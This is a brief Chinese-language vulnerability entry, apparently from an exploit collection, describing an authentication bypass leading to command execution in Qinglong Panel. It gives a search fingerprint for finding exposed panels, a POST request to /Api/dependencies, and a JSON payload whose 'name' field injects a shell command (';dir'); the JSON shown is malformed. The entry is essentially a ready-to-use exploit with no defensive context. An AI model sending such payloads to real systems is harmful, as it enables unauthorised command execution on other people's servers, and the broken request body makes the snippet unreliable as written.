# 青龙面板dependencies存在鉴权绕过导致命令执行漏洞

- **系统**：青龙面板　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="青龙-定时任务管理面板"`
- **请求**：`POST /Api/dependencies HTTP/1.1`
- **关键头**：`Content-Type: application/json`　`Content-Length: 34`

**请求体 / payload**
```
[
"name": ";dir",
"type": 0
]
```
- **预期**：200　|　—